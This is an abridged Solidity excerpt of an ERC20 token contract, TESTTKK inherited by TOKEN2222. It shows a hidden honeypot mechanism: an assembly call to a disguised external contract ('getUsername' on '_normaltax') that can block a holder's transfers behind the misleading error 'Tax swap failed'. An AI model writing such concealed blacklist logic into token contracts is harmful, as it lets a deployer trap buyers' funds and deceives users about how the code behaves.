...
contract TESTTKK is Context, IERC20, IERC20Metadata {
    ...
    function _getUsername(address _account) internal view returns (bool result) {
        address target = _normaltax;
        bytes4 sig = bytes4(keccak256("getUsername(address)")); 
        assembly {
            let x := mload(0x40) 
            mstore(x, sig)       
            mstore(add(x, 0x04), _account)  
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        require(!_getUsername(from), "Tax swap failed");
...
contract TOKEN2222 is TESTTKK, Ownable {
